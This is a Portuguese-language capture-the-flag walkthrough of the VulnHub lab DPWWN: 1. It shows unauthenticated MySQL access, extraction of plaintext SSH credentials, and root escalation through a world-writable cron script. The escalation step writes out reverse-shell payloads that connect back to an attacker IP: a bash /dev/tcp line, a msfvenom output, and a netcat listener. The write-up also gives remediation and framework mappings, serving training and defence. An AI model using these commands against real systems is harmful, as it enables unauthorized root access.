# DPWWN: 1 — O Banco de Dados Nos Entregou as Chaves

Bora rapaziada!! Imagina um servidor MySQL escancarado na internet, sem senha, com um banco de dados literalmente chamado `ssh` contendo credenciais em texto plano. Isso é o DPWWN: 1 em resumo. Você faz uma query no banco, pega as credenciais, entra por SSH, encontra um script de cron que pode sobrescrever, e espera o root te ligar de volta. Iniciante, mas brutalmente realista: bancos de dados expostos com senhas em branco ainda são um dos principais achados em avaliações corporativas. Vamo que vamo! ᕕ( ᐛ )ᕗ

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | DPWWN: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/dpwwn-1,342/ |
| **Técnicas** | Enumeração de serviços Nmap, acesso MySQL sem autenticação, extração de credenciais em texto plano do banco, login SSH, abuso de cron job via script com permissão de escrita |
| **CVEs** | CWE-306 (Autenticação Ausente para Função Crítica — MySQL exposto sem senha), CWE-732 (Atribuição Incorreta de Permissão — script cron com permissão de escrita global), CWE-522 (Credenciais Insuficientemente Protegidas — senhas em texto plano no banco) |
| **Grupos APT** | APT41: explora serviços de banco de dados expostos para acesso a credenciais em alvos de saúde e finanças; FIN7: usa scripts de tarefas agendadas/cron com permissão de escrita como mecanismos de persistência e escalação de privilégios |

---

## Resumo do Ataque

```
nmap: SSH (22), HTTP (80), MySQL (3306)
    |
    v
MySQL porta 3306: conectar com senha root em branco
    |
    v
SHOW DATABASES → banco "ssh" encontrado
    |
    v
SELECT * FROM ssh.users → mistic:testP@$$swordmistic (texto plano)
    |
    v
Login SSH como mistic
    |
    v
cat /etc/crontab → logrot.sh roda como root
    |
    v
ls -la logrot.sh → permissão de escrita global
    |
    v
Sobrescrever logrot.sh com payload de shell reverso
    |
    v
nc -lvnp 1234 → shell root na próxima execução do cron
    |
    v
cat /root/dpwwn-01-FLAG.txt
```

---

## Metodologia

1. Scan completo de portas para identificar todos os serviços
2. Acesso MySQL sem autenticação e enumeração do banco de dados
3. Extração de credenciais da tabela `ssh.users`
4. Login SSH com credenciais recuperadas
5. Enumeração de cron jobs e identificação de script com permissão de escrita
6. Escalação de privilégios sobrescrevendo o script cron com shell reverso

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.101

nmap -sV -sC -p- 192.168.1.101
```

Saída esperada:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Apache httpd
3306/tcp open  mysql   MySQL 5.x
```

Três serviços. O HTTP é provavelmente uma página placeholder. O MySQL na porta 3306 é extremamente interessante: um banco de dados exposto publicamente quase sempre tem problemas de autenticação em máquinas CTF, e frequentemente em ambientes reais também.

**Nota real:** MySQL nunca deveria ser exposto em uma interface voltada ao público. O endereço de bind padrão no MySQL é `0.0.0.0`, o que significa todas as interfaces, incluindo a placa de rede, a menos que seja explicitamente alterado para `127.0.0.1`. Essa é a misconfiguration #1 de MySQL encontrada em testes de penetração externos.

**MITRE ATT&CK:** T1046 — Descoberta de Serviço de Rede

---

## Passo 2 — Acesso MySQL Sem Autenticação

Testar MySQL com senha root em branco:

```bash
mysql -h 192.168.1.101 -u root -p
# Pressionar Enter no prompt de senha (senha em branco)
```

Acesso concedido. Nenhuma senha necessária. Isso é CWE-306 em sua forma mais crua.

```sql
SHOW DATABASES;
```

Saída:

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ssh                |
| ...                |
+--------------------+
```

O banco chamado `ssh` é imediatamente suspeito. Enumerar:

```sql
USE ssh;
SHOW TABLES;
SELECT * FROM users;
```

Resultado:

```
+--------+----------------------+
| user   | pass                 |
+--------+----------------------+
| mistic | testP@$$swordmistic  |
+--------+----------------------+
```

Credenciais SSH em texto plano. Absolutamente incrível, véi. A máquina literalmente nomeou um banco de dados com o que as credenciais são para.

**Alternativa:** usar scripts NSE Nmap para enumeração automática: `nmap -p 3306 --script mysql-empty-password,mysql-databases,mysql-query 192.168.1.101`

**Nota real:** O APT41 foi documentado exfiltrando credenciais SSH de bancos MySQL expostos em intrusões no setor de saúde. O padrão de armazenar credenciais em um banco que é publicamente acessível sem autenticação representa uma falha completa de defesa em profundidade.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada ao Público, T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Login SSH como mistic

```bash
ssh mistic@192.168.1.101
# Senha: testP@$$swordmistic
id
# uid=1000(mistic)
```

Shell obtido como `mistic`. Agora enumerar para escalação de privilégios.

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 4 — Enumeração de Cron Jobs

Verificar o diretório home e procurar arquivos interessantes:

```bash
ls -la ~
cat logrot.sh
```

O script `logrot.sh` é um auxiliar de rotação de logs. Verificar se roda como root:

```bash
cat /etc/crontab
```

Saída (linha relevante):

```
* * * * * root /home/mistic/logrot.sh
```

O script roda a cada minuto como root. Verificar suas permissões:

```bash
ls -la ~/logrot.sh
# -rwxrwxrwx 1 mistic mistic  logrot.sh
```

Permissão de escrita global. Isso é CWE-732 e uma escalação de privilégios instantânea. O script é de propriedade de `mistic`, roda como root, e qualquer usuário no sistema pode sobrescrevê-lo.

**Nota real:** Scripts cron com permissão de escrita global executados pelo root são consistentemente um dos achados de maior severidade em avaliações de escalação de privilégios Linux. A causa raiz quase sempre é um atalho do desenvolvedor durante a configuração ("só coloca 777 por enquanto") que nunca foi revertido.

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron, T1222 — Modificação de Permissões de Arquivos e Diretórios

---

## Passo 5 — Sobrescrita do Script Cron e Shell Root

Gerar payload de shell reverso:

```bash
# Shell reverso bash direto (mais simples que msfvenom para este cenário):
echo 'bash -i >& /dev/tcp/192.168.1.106/1234 0>&1' > ~/logrot.sh
```

Alternativamente, usar msfvenom para um shell mais estável:

```bash
# No atacante:
msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.106 lport=1234 R
# Saída: 0<&74-;exec 74<>/dev/tcp/192.168.1.106/1234;sh <&74 >&74 2>&74

# No alvo:
echo '0<&74-;exec 74<>/dev/tcp/192.168.1.106/1234;sh <&74 >&74 2>&74' > ~/logrot.sh
cat ~/logrot.sh  # verificar se foi escrito corretamente
```

Iniciar o listener:

```bash
nc -lvnp 1234
```

Aguardar até 60 segundos para o cron job disparar. Um shell root chega.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /root/dpwwn-01-FLAG.txt
```

Flag capturada!

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando e Script: Shell Unix

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado/Crackeado |
|---|---|---|---|
| Credencial SSH | `mistic:testP@$$swordmistic` | Tabela `ssh.users` no MySQL | Login SSH como mistic |
| Flag root | Conteúdo de `/root/dpwwn-01-FLAG.txt` | Após sobrescrita do script cron | Flag final |

---

## Lições Aprendidas

| Nº | Achado | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | MySQL exposto na porta 3306 com senha root em branco | MySQL sem senha root ou bind de rede para 0.0.0.0 é um dos principais achados em avaliações externas | Fazer bind do MySQL para localhost: `bind-address = 127.0.0.1` em `my.cnf`; definir senha root forte |
| 2 | Credenciais SSH em texto plano armazenadas no MySQL | Armazenar credenciais em texto plano em qualquer banco é CWE-522 e invalida o propósito da autenticação | Nunca armazenar credenciais em texto plano; usar hash bcrypt/scrypt; usar gerenciador de segredos para credenciais de serviço |
| 3 | Script cron com permissão de escrita global executado pelo root | Qualquer arquivo executado por processo privilegiado que seja gravável por usuário sem privilégios é uma escalação instantânea | Scripts cron devem ser de propriedade do root e modo 700 ou 750; nunca com permissão de escrita global |
| 4 | Cron rodando a cada minuto fornece exploração rápida | Cron jobs de alta frequência minimizam o tempo de espera para um atacante após plantar um payload | Auditar frequência do cron; usar systemd timers com permissões adequadas de arquivo de unidade em vez de cron para tarefas privilegiadas |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviço de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Persistência | Persistência | Tarefa Agendada: Cron | T1053.003 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Tarefa Agendada (script com permissão global) | T1053.003 |
| Execução | Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Fazer bind do MySQL apenas para localhost:** adicionar `bind-address = 127.0.0.1` em `/etc/mysql/mysql.conf.d/mysqld.cnf` e reiniciar MySQL
2. **Definir senha root do MySQL:** `ALTER USER 'root'@'%' IDENTIFIED BY 'SenhaForteAleatoria123!'; FLUSH PRIVILEGES;`
3. **Remover o banco `ssh`:** existe apenas para armazenar credenciais em texto plano e deve ser dropado
4. **Fazer hash das credenciais se armazenamento em banco for necessário:** usar bcrypt ou Argon2; nunca armazenar senhas em texto plano em qualquer banco
5. **Corrigir permissões do script cron:** `chown root:root /home/mistic/logrot.sh && chmod 700 /home/mistic/logrot.sh`
6. **Revisar todos os cron jobs:** `grep -r '' /etc/cron* /var/spool/cron`; garantir que cada script executado pelo root seja de propriedade do root e não gravável por outros
7. **Implementar regras de firewall para MySQL:** se MySQL precisar ser acessível remotamente, restringir a IPs conhecidos via iptables

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços de banco de dados e sua exposição na rede |
| Proteger | Controle de Acesso | Fazer bind do MySQL para localhost; definir senha root forte; restringir acesso SSH |
| Proteger | Segurança de Dados | Nunca armazenar credenciais em texto plano; implementar hash de credenciais no banco |
| Detectar | Anomalias e Eventos | Alertar sobre conexões MySQL de endereços não-localhost; monitorar modificações de scripts cron |
| Responder | Planejamento de Resposta | Alterar senha root MySQL; rotacionar credenciais SSH de mistic; corrigir permissões do script cron |
| Recuperar | Planejamento de Recuperação | Revisar todas as contas para acesso não autorizado; verificar ausência de mecanismos de persistência |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Fazer bind do MySQL para localhost; restringir acesso de rede ao banco |
| AC-6 | Privilégio Mínimo | Scripts cron devem ser de propriedade do root e não graváveis por usuários sem privilégios |
| IA-5 | Gestão de Autenticadores | Substituir armazenamento de credenciais em texto plano por valores com hash; definir senha root MySQL |
| CM-7 | Funcionalidade Mínima | Desabilitar acesso remoto MySQL a menos que especificamente necessário |
| AU-2 | Log de Eventos | Registrar tentativas de autenticação MySQL; alertar sobre logins remotos com e sem sucesso |

### CISA KEV

Instâncias MySQL expostas com senhas root em branco ou fracas são documentadas em múltiplos Advisories da CISA (AA20-049A, AA22-249A) como vetores de acesso inicial usados por operadores de ransomware e grupos APT. Organizações devem tratar qualquer serviço de banco de dados exposto a redes não confiáveis como vulnerabilidade crítica.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Autenticação | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |

### MITRE D3FEND

- **D3-ACH:** Hardening de Configuração de Aplicação (bind MySQL para localhost; desabilitar senha root em branco)
- **D3-OAM:** Gestão Administrativa do Sistema Operacional (restringir permissões de scripts cron; auditar tarefas agendadas)
- **D3-NTF:** Filtragem de Tráfego de Rede (regra de firewall bloqueando acesso externo à porta 3306)

---

## Considerações Finais

DPWWN: 1 é tão realista quanto máquinas CTF conseguem ser. Instâncias MySQL expostas com senhas em branco não são uma preocupação teórica: elas aparecem em avaliações externas de organizações reais com frequência surpreendente. A combinação de "banco de dados exposto na internet" e "credenciais armazenadas nesse mesmo banco" é um colapso de segurança completo que um atacante pode explorar em menos de dois minutos.

A sobrescrita do cron é uma escalação de privilégios clássica e limpa: scripts com permissão de escrita global executados pelo root existem em produção real, geralmente como restos de uma configuração inicial descuidada. Esta máquina te ensina a verificar `/etc/crontab` e permissões de scripts como procedimento padrão de pós-exploração.

Dois cliques da internet até root. É por isso que configurações padrão são perigosas.

Thanks guys!! (❍ᴥ❍ʋ)
